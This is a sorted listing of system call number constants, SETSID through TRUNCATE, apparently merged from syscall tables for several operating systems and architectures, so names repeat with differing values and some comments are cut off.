SYS_SETSID                  = 157
SYS_SETSID                  = 175
SYS_SETSID                  = 5110
SYS_SETSID                  = 66
SYS_SETSID                 = 147 // { int setsid(void)
SYS_SETSID               = 147 // { int
SYS_SETSID         = 147 // { int sys_setsid(void)
SYS_SETSOCKOPT                      = 0x365
SYS_SETSOCKOPT                     = 105
SYS_SETSOCKOPT                   = 294
SYS_SETSOCKOPT                   = 339
SYS_SETSOCKOPT                   = 366
SYS_SETSOCKOPT                   = 4181
SYS_SETSOCKOPT              = 208
SYS_SETSOCKOPT              = 339
SYS_SETSOCKOPT              = 355
SYS_SETSOCKOPT              = 366
SYS_SETSOCKOPT              = 5053
SYS_SETSOCKOPT              = 54
SYS_SETSOCKOPT           = 105 // { int
SYS_SETSOURCEFILTER                 = 0xC78
SYS_SETSTATE                        = 0x2C3
SYS_SETTID                         = 285
SYS_SETTID_WITH_PID                = 311
SYS_SETTIMEOFDAY                   = 122
SYS_SETTIMEOFDAY                 = 4079
SYS_SETTIMEOFDAY                 = 79
SYS_SETTIMEOFDAY             = 122 // { int settimeofday(struct timeval 
SYS_SETTIMEOFDAY            = 122
SYS_SETTIMEOFDAY            = 164
SYS_SETTIMEOFDAY            = 170
SYS_SETTIMEOFDAY            = 5159
SYS_SETTIMEOFDAY            = 79
SYS_SETTIMEOFDAY           = 122 // { int settimeofday(struct timeval 
SYS_SETTIMEOFDAY         = 419 // { int
SYS_SETTIMEOFDAY   = 68  // { int sys_settimeofday(const struct timeval 
SYS_SETUID                          = 0x1BC
SYS_SETUID                         = 23
SYS_SETUID                       = 23
SYS_SETUID                       = 4023
SYS_SETUID                   = 23  // { int setuid(uid_t uid)
SYS_SETUID                  = 105
SYS_SETUID                  = 146
SYS_SETUID                  = 213
SYS_SETUID                  = 23
SYS_SETUID                  = 5103
SYS_SETUID                 = 23  // { int setuid(uid_t uid)
SYS_SETUID               = 23  // { int
SYS_SETUID         = 23  // { int sys_setuid(uid_t uid)
SYS_SETUID32                     = 213
SYS_SETUTXENT                       = 0x2DF
SYS_SETVBUF                         = 0x06C
SYS_SETWGROUPS                     = 289
SYS_SETXATTR                       = 236
SYS_SETXATTR                     = 209
SYS_SETXATTR                     = 226
SYS_SETXATTR                     = 4224
SYS_SETXATTR                = 169
SYS_SETXATTR                = 188
SYS_SETXATTR                = 209
SYS_SETXATTR                = 224
SYS_SETXATTR                = 5
SYS_SETXATTR                = 5180
SYS_SETXATTR             = 375 // { int
SYS_SET_MEMPOLICY                = 261
SYS_SET_MEMPOLICY                = 276
SYS_SET_MEMPOLICY                = 321
SYS_SET_MEMPOLICY                = 4270
SYS_SET_MEMPOLICY           = 237
SYS_SET_MEMPOLICY           = 238
SYS_SET_MEMPOLICY           = 261
SYS_SET_MEMPOLICY           = 270
SYS_SET_MEMPOLICY           = 305
SYS_SET_MEMPOLICY           = 5229
SYS_SET_MEMPOLICY_HOME_NODE      = 4450
SYS_SET_MEMPOLICY_HOME_NODE      = 450
SYS_SET_MEMPOLICY_HOME_NODE = 450
SYS_SET_MEMPOLICY_HOME_NODE = 5450
SYS_SET_ROBUST_LIST              = 300
SYS_SET_ROBUST_LIST              = 311
SYS_SET_ROBUST_LIST              = 338
SYS_SET_ROBUST_LIST              = 4309
SYS_SET_ROBUST_LIST         = 273
SYS_SET_ROBUST_LIST         = 300
SYS_SET_ROBUST_LIST         = 304
SYS_SET_ROBUST_LIST         = 5268
SYS_SET_ROBUST_LIST         = 99
SYS_SET_THREAD_AREA              = 243
SYS_SET_THREAD_AREA              = 4283
SYS_SET_THREAD_AREA         = 205
SYS_SET_THREAD_AREA         = 5242
SYS_SET_TID_ADDRESS              = 232
SYS_SET_TID_ADDRESS              = 256
SYS_SET_TID_ADDRESS              = 258
SYS_SET_TID_ADDRESS              = 4252
SYS_SET_TID_ADDRESS         = 166
SYS_SET_TID_ADDRESS         = 218
SYS_SET_TID_ADDRESS         = 232
SYS_SET_TID_ADDRESS         = 252
SYS_SET_TID_ADDRESS         = 5212
SYS_SET_TID_ADDRESS         = 96
SYS_SFI_CTL                        = 456
SYS_SFI_PIDCTL                     = 457
SYS_SGETMASK                     = 4068
SYS_SGETMASK                     = 68
SYS_SGETMASK                = 199
SYS_SGETMASK                = 68
SYS_SHARED_REGION_CHECK_NP         = 294
SYS_SHARED_REGION_MAP_AND_SLIDE_NP = 438
SYS_SHMAT                           = 0x27D
SYS_SHMAT                          = 262
SYS_SHMAT                        = 305
SYS_SHMAT                        = 397
SYS_SHMAT                        = 4397
SYS_SHMAT                   = 196
SYS_SHMAT                   = 30
SYS_SHMAT                   = 397
SYS_SHMAT                   = 5029
SYS_SHMAT                = 228 // { void 
SYS_SHMAT          = 228 // { void 
SYS_SHMCTL                          = 0x27E
SYS_SHMCTL                         = 263
SYS_SHMCTL                       = 308
SYS_SHMCTL                       = 396
SYS_SHMCTL                       = 4396
SYS_SHMCTL                  = 195
SYS_SHMCTL                  = 31
SYS_SHMCTL                  = 396
SYS_SHMCTL                  = 5030
SYS_SHMCTL               = 443 // { int
SYS_SHMDT                           = 0x27F
SYS_SHMDT                          = 264
SYS_SHMDT                        = 306
SYS_SHMDT                        = 398
SYS_SHMDT                        = 4398
SYS_SHMDT                    = 230 // { int shmdt(const void 
SYS_SHMDT                   = 197
SYS_SHMDT                   = 398
SYS_SHMDT                   = 5065
SYS_SHMDT                   = 67
SYS_SHMDT                  = 230 // { int shmdt(const void 
SYS_SHMDT                = 230 // { int
SYS_SHMDT          = 230 // { int sys_shmdt(const void 
SYS_SHMGET                          = 0x280
SYS_SHMGET                         = 265
SYS_SHMGET                       = 307
SYS_SHMGET                       = 395
SYS_SHMGET                       = 4395
SYS_SHMGET                  = 194
SYS_SHMGET                  = 29
SYS_SHMGET                  = 395
SYS_SHMGET                  = 5028
SYS_SHMGET               = 231 // { int
SYS_SHMSYS                         = 253
SYS_SHM_OPEN                        = 0xC8C
SYS_SHM_OPEN                       = 266
SYS_SHM_OPEN                 = 482 // { int shm_open(const char 
SYS_SHM_UNLINK                      = 0xC8D
SYS_SHM_UNLINK                     = 267
SYS_SHM_UNLINK               = 483 // { int shm_unlink(const char 
SYS_SHUTDOWN                        = 0x366
SYS_SHUTDOWN                       = 134
SYS_SHUTDOWN                     = 293
SYS_SHUTDOWN                     = 338
SYS_SHUTDOWN                     = 373
SYS_SHUTDOWN                     = 4182
SYS_SHUTDOWN                = 134
SYS_SHUTDOWN                = 210
SYS_SHUTDOWN                = 338
SYS_SHUTDOWN                = 373
SYS_SHUTDOWN                = 48
SYS_SHUTDOWN                = 5047
SYS_SHUTDOWN             = 134 // { int
SYS_SIGACTION                       = 0x1BD
SYS_SIGACTION                      = 46
SYS_SIGACTION                    = 4067
SYS_SIGACTION                    = 67
SYS_SIGACTION               = 198
SYS_SIGACTION               = 67
SYS_SIGADDSET                       = 0x1BE
SYS_SIGALTSTACK                     = 0x28A
SYS_SIGALTSTACK                    = 53
SYS_SIGALTSTACK                  = 185
SYS_SIGALTSTACK                  = 186
SYS_SIGALTSTACK                  = 4206
SYS_SIGALTSTACK              = 53  // { int sigaltstack(stack_t 
SYS_SIGALTSTACK             = 131
SYS_SIGALTSTACK             = 132
SYS_SIGALTSTACK             = 185
SYS_SIGALTSTACK             = 186
SYS_SIGALTSTACK             = 28
SYS_SIGALTSTACK             = 5129
SYS_SIGALTSTACK            = 53  // { int sigaltstack(stack_t 
SYS_SIGALTSTACK    = 288 // { int sys_sigaltstack(const struct sigaltstack 
SYS_SIGDELSET                       = 0x1BF
SYS_SIGEMPTYSET                     = 0x1C0
SYS_SIGFILLSET                      = 0x1C1
SYS_SIGHOLD                         = 0x28B
SYS_SIGIGNORE                       = 0x28C
SYS_SIGINTERRUPT                    = 0x28D
SYS_SIGISMEMBER                     = 0x1C2
SYS_SIGLONGJMP                      = 0x1C3
SYS_SIGNAL                          = 0x061
SYS_SIGNAL                       = 4048
SYS_SIGNAL                       = 48
SYS_SIGNAL                  = 48
SYS_SIGNALFD                     = 305
SYS_SIGNALFD                     = 321
SYS_SIGNALFD                     = 349
SYS_SIGNALFD                     = 4317
SYS_SIGNALFD                = 282
SYS_SIGNALFD                = 305
SYS_SIGNALFD                = 311
SYS_SIGNALFD                = 316
SYS_SIGNALFD                = 5276
SYS_SIGNALFD4                    = 313
SYS_SIGNALFD4                    = 327
SYS_SIGNALFD4                    = 355
SYS_SIGNALFD4                    = 4324
SYS_SIGNALFD4               = 289
SYS_SIGNALFD4               = 313
SYS_SIGNALFD4               = 317
SYS_SIGNALFD4               = 322
SYS_SIGNALFD4               = 5283
SYS_SIGNALFD4               = 74
SYS_SIGNIFIC                        = 0x4D5
SYS_SIGNIFICAND                     = 0x4D5
SYS_SIGPAUSE                        = 0x28E
SYS_SIGPENDING                      = 0x1C4
SYS_SIGPENDING                     = 52
SYS_SIGPENDING                   = 4073
SYS_SIGPENDING                   = 73
SYS_SIGPENDING               = 343 // { int sigpending(sigset_t 
SYS_SIGPENDING              = 183
SYS_SIGPENDING              = 73
SYS_SIGPENDING             = 343 // { int sigpending(sigset_t 
SYS_SIGPENDING     = 52  // { int sys_sigpending(void)
SYS_SIGPROCMASK                     = 0x1C5
SYS_SIGPROCMASK                    = 48
SYS_SIGPROCMASK                  = 126
SYS_SIGPROCMASK                  = 4126
SYS_SIGPROCMASK             = 126
SYS_SIGPROCMASK             = 220
SYS_SIGQUEUE                        = 0x5A9
SYS_SIGQUEUEINFO         = 245 // { int
SYS_SIGRELSE                        = 0x28F
SYS_SIGRETURN                      = 184
SYS_SIGRETURN                    = 119
SYS_SIGRETURN                    = 4119
SYS_SIGRETURN                = 417 // { int sigreturn( const struct __ucontext 
SYS_SIGRETURN               = 119
SYS_SIGRETURN               = 216
SYS_SIGRETURN              = 344 // { int sigreturn(ucontext_t 
SYS_SIGRETURN      = 103 // { int sys_sigreturn(struct sigcontext 
SYS_SIGSET                          = 0x290
SYS_SIGSETJMP                       = 0x1C6
SYS_SIGSTACK                        = 0x291
SYS_SIGSUSPEND                      = 0x1C7
SYS_SIGSUSPEND                     = 111
SYS_SIGSUSPEND                   = 4072
SYS_SIGSUSPEND                   = 72
SYS_SIGSUSPEND               = 341 // { int sigsuspend(const sigset_t 
SYS_SIGSUSPEND              = 201
SYS_SIGSUSPEND              = 72
SYS_SIGSUSPEND             = 341 // { int sigsuspend(const sigset_t 
SYS_SIGSUSPEND     = 111 // { int sys_sigsuspend(int mask)
SYS_SIGSUSPEND_NOCANCEL            = 410
SYS_SIGTIMEDWAIT                    = 0x52D
SYS_SIGTIMEDWAIT             = 345 // { int sigtimedwait(const sigset_t 
SYS_SIGTIMEDWAIT           = 345 // { int sigtimedwait(const sigset_t 
SYS_SIGWAIT                         = 0x1E3
SYS_SIGWAIT                  = 429 // { int sigwait(const sigset_t 
SYS_SIGWAITINFO                     = 0x52E
SYS_SIGWAITINFO              = 346 // { int sigwaitinfo(const sigset_t 
SYS_SIGWAITINFO            = 346 // { int sigwaitinfo(const sigset_t 
SYS_SIN                             = 0x03F
SYS_SIND128                         = 0xC22
SYS_SIND32                          = 0xC20
SYS_SIND64                          = 0xC21
SYS_SINF                            = 0x64B
SYS_SINH                            = 0x042
SYS_SINHD128                        = 0xC25
SYS_SINHD32                         = 0xC23
SYS_SINHD64                         = 0xC24
SYS_SINHF                           = 0x64F
SYS_SINHL                           = 0x650
SYS_SINL                            = 0x64C
SYS_SIZEOF_ALLOC                    = 0xCEA
SYS_SLEEP                           = 0x1C8
SYS_SLEEP       = 17
SYS_SNPRINTF                        = 0x8DA
SYS_SOCKATMARK                      = 0xC68
SYS_SOCKET                          = 0x367
SYS_SOCKET                         = 97
SYS_SOCKET                       = 281
SYS_SOCKET                       = 326
SYS_SOCKET                       = 359
SYS_SOCKET                       = 4183
SYS_SOCKET                  = 198
SYS_SOCKET                  = 326
SYS_SOCKET                  = 359
SYS_SOCKET                  = 41
SYS_SOCKET                  = 5040
SYS_SOCKET                  = 97
SYS_SOCKET               = 394 // { int
SYS_SOCKETCALL                   = 102
SYS_SOCKETCALL                   = 4102
SYS_SOCKETCALL              = 102
SYS_SOCKETCALL              = 206
SYS_SOCKETPAIR                      = 0x368
SYS_SOCKETPAIR                     = 135
SYS_SOCKETPAIR                   = 288
SYS_SOCKETPAIR                   = 333
SYS_SOCKETPAIR                   = 360
SYS_SOCKETPAIR                   = 4184
SYS_SOCKETPAIR              = 135
SYS_SOCKETPAIR              = 199
SYS_SOCKETPAIR              = 333
SYS_SOCKETPAIR              = 360
SYS_SOCKETPAIR              = 5052
SYS_SOCKETPAIR              = 53
SYS_SOCKETPAIR           = 135 // { int
SYS_SOCKET_DELEGATE                = 450
SYS_SOCK_DEBUG                      = 0x47A
SYS_SOCK_DO_TESTSTOR                = 0x47D
SYS_SPAWN                           = 0x330
SYS_SPAWNP                          = 0x331
SYS_SPLICE                       = 283
SYS_SPLICE                       = 313
SYS_SPLICE                       = 340
SYS_SPLICE                       = 4304
SYS_SPLICE                  = 232
SYS_SPLICE                  = 275
SYS_SPLICE                  = 283
SYS_SPLICE                  = 306
SYS_SPLICE                  = 5263
SYS_SPLICE                  = 76
SYS_SPRINTF                         = 0x071
SYS_SPU_CREATE                   = 279
SYS_SPU_CREATE              = 279
SYS_SPU_RUN                      = 278
SYS_SPU_RUN                 = 278
SYS_SQRT                            = 0x021
SYS_SQRTD128                        = 0xC28
SYS_SQRTD32                         = 0xC26
SYS_SQRTD64                         = 0xC27
SYS_SQRTF                           = 0x64D
SYS_SQRTL                           = 0x64E
SYS_SRAND                           = 0x057
SYS_SRAND48                         = 0x2EB
SYS_SRANDOM                         = 0x2C5
SYS_SSCANF                          = 0x06E
SYS_SSETMASK                     = 4069
SYS_SSETMASK                     = 69
SYS_SSETMASK                = 200
SYS_SSETMASK                = 69
SYS_SSTK                     = 70  // { int sstk(int incr)
SYS_SSTK                   = 70  // { int sstk(size_t incr)
SYS_SSTK                 = 70  // { int
SYS_STACK_SNAPSHOT_WITH_CONFIG     = 491
SYS_STAT                            = 0x1C9
SYS_STAT                           = 188
SYS_STAT                         = 106
SYS_STAT                         = 4106
SYS_STAT                     = 188 // { int stat(char 
SYS_STAT                    = 106
SYS_STAT                    = 38
SYS_STAT                    = 4
SYS_STAT                    = 5004
SYS_STAT                   = 475 // { int stat(const char 
SYS_STAT                 = 439 // { int
SYS_STAT           = 38  // { int sys_stat(const char 
SYS_STAT        = 42
SYS_STAT64                         = 338
SYS_STAT64                       = 195
SYS_STAT64                       = 4213
SYS_STAT64                  = 139
SYS_STAT64_EXTENDED                = 341
SYS_STATFS                         = 157
SYS_STATFS                       = 4099
SYS_STATFS                       = 99
SYS_STATFS                   = 396 // { int statfs(char 
SYS_STATFS                  = 137
SYS_STATFS                  = 157
SYS_STATFS                  = 43
SYS_STATFS                  = 5134
SYS_STATFS                  = 99
SYS_STATFS                 = 157 // { int statfs(char 
SYS_STATFS         = 63  // { int sys_statfs(const char 
SYS_STATFS64                       = 345
SYS_STATFS64                     = 252
SYS_STATFS64                     = 266
SYS_STATFS64                     = 268
SYS_STATFS64                     = 4255
SYS_STATFS64                = 234
SYS_STATFS64                = 252
SYS_STATFS64                = 265
SYS_STATFS_FREEBSD12        = 555 // { int statfs(_In_z_ char 
SYS_STATVFS                         = 0x2B5
SYS_STATVFS                = 500 // { int statvfs(const char 
SYS_STATVFS1             = 357 // { int
SYS_STATX                        = 383
SYS_STATX                        = 397
SYS_STATX                        = 4366
SYS_STATX                   = 291
SYS_STATX                   = 332
SYS_STATX                   = 360
SYS_STATX                   = 379
SYS_STATX                   = 383
SYS_STATX                   = 5326
SYS_STAT_EXTENDED                  = 279
SYS_STIME                        = 25
SYS_STIME                        = 4025
SYS_STIME                   = 233
SYS_STIME                   = 25
SYS_STRCASECMP                      = 0x2BF
SYS_STRCAT                          = 0x098
SYS_STRCHR                          = 0x0A0
SYS_STRCMP                          = 0x097
SYS_STRCOLL                         = 0x09C
SYS_STRCPY                          = 0x096
SYS_STRCSPN                         = 0x0A1
SYS_STRDUP                          = 0x2C0
SYS_STRERROR                        = 0x0A8
SYS_STRERROR_R                      = 0xB33
SYS_STRFMON                         = 0x119
SYS_STRFTIME                        = 0x0B2
SYS_STRLEN                          = 0x0A9
SYS_STRNCASECMP                     = 0x2C1
SYS_STRNCAT                         = 0x099
SYS_STRNCMP                         = 0x09D
SYS_STRNCPY                         = 0x093
SYS_STRPBRK                         = 0x0A2
SYS_STRPTIME                        = 0x118
SYS_STRRCHR                         = 0x09F
SYS_STRSPN                          = 0x0A4
SYS_STRSTR                          = 0x0A5
SYS_STRTOCOLL                       = 0x14D
SYS_STRTOD                          = 0x053
SYS_STRTOD128                       = 0xC2B
SYS_STRTOD32                        = 0xC29
SYS_STRTOD64                        = 0xC2A
SYS_STRTOF                          = 0x957
SYS_STRTOIMAX                       = 0x952
SYS_STRTOK                          = 0x0A6
SYS_STRTOK_R                        = 0x5E5
SYS_STRTOL                          = 0x054
SYS_STRTOLD                         = 0x958
SYS_STRTOLL                         = 0x5B0
SYS_STRTOUL                         = 0x055
SYS_STRTOULL                        = 0x5B1
SYS_STRTOUMAX                       = 0x953
SYS_STRXFRM                         = 0x09E
SYS_STTY                         = 31
SYS_STTY                         = 4031
SYS_STTY                    = 31
SYS_SUBPAGE_PROT                 = 310
SYS_SUBPAGE_PROT            = 310
SYS_SVC99                           = 0x241
SYS_SWAB                            = 0x2D3
SYS_SWAPCONTEXT                     = 0x433
SYS_SWAPCONTEXT                  = 249
SYS_SWAPCONTEXT              = 423 // { int swapcontext(struct __ucontext 
SYS_SWAPCONTEXT             = 249
SYS_SWAPCTL              = 271 // { int
SYS_SWAPOFF                      = 115
SYS_SWAPOFF                      = 4115
SYS_SWAPOFF                  = 424 // { int swapoff(const char 
SYS_SWAPOFF                 = 115
SYS_SWAPOFF                 = 168
SYS_SWAPOFF                 = 213
SYS_SWAPOFF                 = 225
SYS_SWAPOFF                 = 5163
SYS_SWAPOFF                = 529 // { int swapoff(char 
SYS_SWAPON                         = 85
SYS_SWAPON                       = 4087
SYS_SWAPON                       = 87
SYS_SWAPON                   = 85  // { int swapon(char 
SYS_SWAPON                  = 167
SYS_SWAPON                  = 224
SYS_SWAPON                  = 5162
SYS_SWAPON                  = 85
SYS_SWAPON                  = 87
SYS_SWAPON                 = 85  // { int swapon(char 
SYS_SWITCH_ENDIAN                = 363
SYS_SWITCH_ENDIAN           = 363
SYS_SWPRINTF                        = 0x135
SYS_SWSCANF                         = 0x137
SYS_SYMLINK                         = 0x1CB
SYS_SYMLINK                        = 57
SYS_SYMLINK                      = 4083
SYS_SYMLINK                      = 83
SYS_SYMLINK                  = 57  // { int symlink(char 
SYS_SYMLINK                 = 5086
SYS_SYMLINK                 = 57
SYS_SYMLINK                 = 83
SYS_SYMLINK                 = 88
SYS_SYMLINK                = 57  // { int symlink(char 
SYS_SYMLINK              = 57  // { int
SYS_SYMLINK        = 57  // { int sys_symlink(const char 
SYS_SYMLINKAT                      = 474
SYS_SYMLINKAT                    = 295
SYS_SYMLINKAT                    = 304
SYS_SYMLINKAT                    = 331
SYS_SYMLINKAT                    = 4297
SYS_SYMLINKAT                = 502 // { int symlinkat(char 
SYS_SYMLINKAT               = 266
SYS_SYMLINKAT               = 293
SYS_SYMLINKAT               = 295
SYS_SYMLINKAT               = 297
SYS_SYMLINKAT               = 36
SYS_SYMLINKAT               = 5256
SYS_SYMLINKAT              = 528 // { int symlinkat(char 
SYS_SYMLINKAT            = 470 // { int
SYS_SYMLINKAT      = 324 // { int sys_symlinkat(const char 
SYS_SYNC                            = 0x32F
SYS_SYNC                           = 36
SYS_SYNC                         = 36
SYS_SYNC                         = 4036
SYS_SYNC                     = 36  // { int sync(void)
SYS_SYNC                    = 162
SYS_SYNC                    = 36
SYS_SYNC                    = 5157
SYS_SYNC                    = 81
SYS_SYNC                   = 36  // { int sync(void)
SYS_SYNC                 = 36  // { void
SYS_SYNC           = 36  // { void sys_sync(void)
SYS_SYNCFS                       = 344
SYS_SYNCFS                       = 348
SYS_SYNCFS                       = 373
SYS_SYNCFS                       = 4342
SYS_SYNCFS                  = 267
SYS_SYNCFS                  = 306
SYS_SYNCFS                  = 335
SYS_SYNCFS                  = 338
SYS_SYNCFS                  = 348
SYS_SYNCFS                  = 5301
SYS_SYNC_FILE_RANGE              = 314
SYS_SYNC_FILE_RANGE              = 4305
SYS_SYNC_FILE_RANGE         = 255
SYS_SYNC_FILE_RANGE         = 277
SYS_SYNC_FILE_RANGE         = 307
SYS_SYNC_FILE_RANGE         = 5264
SYS_SYNC_FILE_RANGE         = 84
SYS_SYNC_FILE_RANGE2             = 308
SYS_SYNC_FILE_RANGE2        = 308
SYS_SYSARCH              = 165 // { int
SYS_SYSCALL                        = 0
SYS_SYSCALL                      = 4000
SYS_SYSCALL_MASK                 = 0
SYS_SYSCONF                         = 0x1CC
SYS_SYSCTL                         = 202
SYS_SYSCTL         = 202 // { int sys_sysctl(const int 
SYS_SYSCTLBYNAME                   = 274
SYS_SYSFS                        = 135
SYS_SYSFS                        = 4135
SYS_SYSFS                   = 135
SYS_SYSFS                   = 139
SYS_SYSFS                   = 226
SYS_SYSFS                   = 5136
SYS_SYSINFO                      = 116
SYS_SYSINFO                      = 4116
SYS_SYSINFO                 = 116
SYS_SYSINFO                 = 179
SYS_SYSINFO                 = 214
SYS_SYSINFO                 = 5097
SYS_SYSINFO                 = 99
SYS_SYSLOG                          = 0x374
SYS_SYSLOG                       = 103
SYS_SYSLOG                       = 4103
SYS_SYSLOG                  = 103
SYS_SYSLOG                  = 116
SYS_SYSLOG                  = 207
SYS_SYSLOG                  = 5101
SYS_SYSMIPS                      = 4149
SYS_SYSMIPS                 = 5199
SYS_SYSR1       = 0
SYS_SYSTEM                          = 0x24B
SYS_SYSTEM_OVERRIDE                = 454
SYS_SYS_DEBUG_SETCONTEXT         = 256
SYS_SYS_DEBUG_SETCONTEXT    = 256
SYS_TAKESOCKET                      = 0x47E
SYS_TAN                             = 0x041
SYS_TAND128                         = 0xC2E
SYS_TAND32                          = 0xC2C
SYS_TAND64                          = 0xC2D
SYS_TANF                            = 0x651
SYS_TANH                            = 0x019
SYS_TANHD128                        = 0xC31
SYS_TANHD32                         = 0xC2F
SYS_TANHD64                         = 0xC30
SYS_TANHF                           = 0x643
SYS_TANHL                           = 0x644
SYS_TANL                            = 0x652
SYS_TCDRAIN                         = 0x1CD
SYS_TCFLOW                          = 0x1CE
SYS_TCFLUSH                         = 0x1CF
SYS_TCGETATTR                       = 0x1D0
SYS_TCGETPGRP                       = 0x1D1
SYS_TCGETSID                        = 0x37C
SYS_TCSENDBREAK                     = 0x1D2
SYS_TCSETATTR                       = 0x1D3
SYS_TCSETPGRP                       = 0x1D4
SYS_TDELETE                         = 0x2CB
SYS_TEE                          = 284
SYS_TEE                          = 315
SYS_TEE                          = 342
SYS_TEE                          = 4306
SYS_TEE                     = 276
SYS_TEE                     = 280
SYS_TEE                     = 284
SYS_TEE                     = 308
SYS_TEE                     = 5265
SYS_TEE                     = 77
SYS_TELEMETRY                      = 451
SYS_TELLDIR                         = 0x31E
SYS_TEMPNAM                         = 0x31F
SYS_TERMINATE_WITH_PAYLOAD         = 520
SYS_TFIND                           = 0x2CC
SYS_TGAMMA                          = 0x890
SYS_TGAMMAD128                      = 0xC34
SYS_TGAMMAD32                       = 0xC32
SYS_TGAMMAD64                       = 0xC33
SYS_TGAMMAF                         = 0x88F
SYS_TGAMMAL                         = 0x891
SYS_TGKILL                       = 250
SYS_TGKILL                       = 268
SYS_TGKILL                       = 270
SYS_TGKILL                       = 4266
SYS_TGKILL                  = 131
SYS_TGKILL                  = 211
SYS_TGKILL                  = 234
SYS_TGKILL                  = 241
SYS_TGKILL                  = 250
SYS_TGKILL                  = 5225
SYS_THREAD_SELFCOUNTS              = 186
SYS_THREAD_SELFID                  = 372
SYS_THREAD_SELFUSAGE               = 482
SYS_THR_CREATE               = 430 // { int thr_create(ucontext_t 
SYS_THR_EXIT                 = 431 // { void thr_exit(long 
SYS_THR_NEW                  = 455 // { int thr_new(struct thr_param 
SYS_THR_SELF                 = 432 // { int thr_self(long 
SYS_THR_SUSPEND              = 442 // { int thr_suspend( const struct timespec 
SYS_THR_WAKE                 = 443 // { int thr_wake(long id)
SYS_TIME                            = 0x0AD
SYS_TIME                         = 13
SYS_TIME                         = 4013
SYS_TIME                    = 13
SYS_TIME                    = 201
SYS_TIME64                          = 0xCE1
SYS_TIMERFD                      = 4318
SYS_TIMERFD                 = 317
SYS_TIMERFD                 = 5277
SYS_TIMERFD_CREATE               = 306
SYS_TIMERFD_CREATE               = 322
SYS_TIMERFD_CREATE               = 350
SYS_TIMERFD_CREATE               = 4321
SYS_TIMERFD_CREATE          = 283
SYS_TIMERFD_CREATE          = 306
SYS_TIMERFD_CREATE          = 312
SYS_TIMERFD_CREATE          = 319
SYS_TIMERFD_CREATE          = 5280
SYS_TIMERFD_CREATE          = 85
SYS_TIMERFD_GETTIME              = 312
SYS_TIMERFD_GETTIME              = 326
SYS_TIMERFD_GETTIME              = 354
SYS_TIMERFD_GETTIME              = 4322
SYS_TIMERFD_GETTIME         = 287
SYS_TIMERFD_GETTIME         = 312
SYS_TIMERFD_GETTIME         = 316
SYS_TIMERFD_GETTIME         = 321
SYS_TIMERFD_GETTIME         = 5281
SYS_TIMERFD_GETTIME         = 87
SYS_TIMERFD_GETTIME64            = 410
SYS_TIMERFD_GETTIME64            = 4410
SYS_TIMERFD_SETTIME              = 311
SYS_TIMERFD_SETTIME              = 325
SYS_TIMERFD_SETTIME              = 353
SYS_TIMERFD_SETTIME              = 4323
SYS_TIMERFD_SETTIME         = 286
SYS_TIMERFD_SETTIME         = 311
SYS_TIMERFD_SETTIME         = 315
SYS_TIMERFD_SETTIME         = 320
SYS_TIMERFD_SETTIME         = 5282
SYS_TIMERFD_SETTIME         = 86
SYS_TIMERFD_SETTIME64            = 411
SYS_TIMERFD_SETTIME64            = 4411
SYS_TIMER_CREATE                 = 240
SYS_TIMER_CREATE                 = 257
SYS_TIMER_CREATE                 = 259
SYS_TIMER_CREATE                 = 4257
SYS_TIMER_CREATE            = 107
SYS_TIMER_CREATE            = 222
SYS_TIMER_CREATE            = 240
SYS_TIMER_CREATE            = 254
SYS_TIMER_CREATE            = 266
SYS_TIMER_CREATE            = 5216
SYS_TIMER_CREATE         = 235 // { int
SYS_TIMER_DELETE                 = 244
SYS_TIMER_DELETE                 = 261
SYS_TIMER_DELETE                 = 263
SYS_TIMER_DELETE                 = 4261
SYS_TIMER_DELETE            = 111
SYS_TIMER_DELETE            = 226
SYS_TIMER_DELETE            = 244
SYS_TIMER_DELETE            = 258
SYS_TIMER_DELETE            = 265
SYS_TIMER_DELETE            = 5220
SYS_TIMER_DELETE         = 236 // { int
SYS_TIMER_GETOVERRUN             = 243
SYS_TIMER_GETOVERRUN             = 260
SYS_TIMER_GETOVERRUN             = 262
SYS_TIMER_GETOVERRUN             = 4260
SYS_TIMER_GETOVERRUN        = 109
SYS_TIMER_GETOVERRUN        = 225
SYS_TIMER_GETOVERRUN        = 243
SYS_TIMER_GETOVERRUN        = 257
SYS_TIMER_GETOVERRUN        = 264
SYS_TIMER_GETOVERRUN        = 5219
SYS_TIMER_GETOVERRUN     = 239 // { int
SYS_TIMER_GETTIME                = 242
SYS_TIMER_GETTIME                = 259
SYS_TIMER_GETTIME                = 261
SYS_TIMER_GETTIME                = 4259
SYS_TIMER_GETTIME           = 108
SYS_TIMER_GETTIME           = 224
SYS_TIMER_GETTIME           = 242
SYS_TIMER_GETTIME           = 256
SYS_TIMER_GETTIME           = 263
SYS_TIMER_GETTIME           = 5218
SYS_TIMER_GETTIME        = 447 // { int
SYS_TIMER_GETTIME64              = 408
SYS_TIMER_GETTIME64              = 4408
SYS_TIMER_SETTIME                = 241
SYS_TIMER_SETTIME                = 258
SYS_TIMER_SETTIME                = 260
SYS_TIMER_SETTIME                = 4258
SYS_TIMER_SETTIME           = 110
SYS_TIMER_SETTIME           = 223
SYS_TIMER_SETTIME           = 241
SYS_TIMER_SETTIME           = 255
SYS_TIMER_SETTIME           = 262
SYS_TIMER_SETTIME           = 5217
SYS_TIMER_SETTIME        = 446 // { int
SYS_TIMER_SETTIME64              = 409
SYS_TIMER_SETTIME64              = 4409
SYS_TIMES                           = 0x1D5
SYS_TIMES                        = 4043
SYS_TIMES                        = 43
SYS_TIMES                   = 100
SYS_TIMES                   = 153
SYS_TIMES                   = 43
SYS_TIMES                   = 5098
SYS_TKILL                        = 208
SYS_TKILL                        = 238
SYS_TKILL                        = 4236
SYS_TKILL                   = 130
SYS_TKILL                   = 187
SYS_TKILL                   = 200
SYS_TKILL                   = 208
SYS_TKILL                   = 237
SYS_TKILL                   = 5192
SYS_TMPFILE                         = 0x065
SYS_TMPFILE64                       = 0xD4D
SYS_TMPFILE64_UNLOCKED              = 0xD4E
SYS_TMPFILE_UNLOCKED                = 0xCFD
SYS_TMPNAM                          = 0x062
SYS_TOASCII                         = 0x2EE
SYS_TOLOWER                         = 0x03C
SYS_TOUPPER                         = 0x03D
SYS_TOWCTRAN                        = 0x7D8
SYS_TOWCTRANS                       = 0x7D8
SYS_TOWLOWER                        = 0x10D
SYS_TOWUPPER                        = 0x10E
SYS_TRUNC                           = 0x893
SYS_TRUNCATE                        = 0x29C
SYS_TRUNCATE                       = 200
SYS_TRUNCATE                     = 4092
SYS_TRUNCATE                     = 92
SYS_TRUNCATE                 = 479 // { int truncate(char 
SYS_TRUNCATE                = 129
SYS_TRUNCATE                = 45
SYS_TRUNCATE                = 5074
SYS_TRUNCATE                = 76
SYS_TRUNCATE                = 92
SYS_TRUNCATE               = 200 // { int truncate(char 
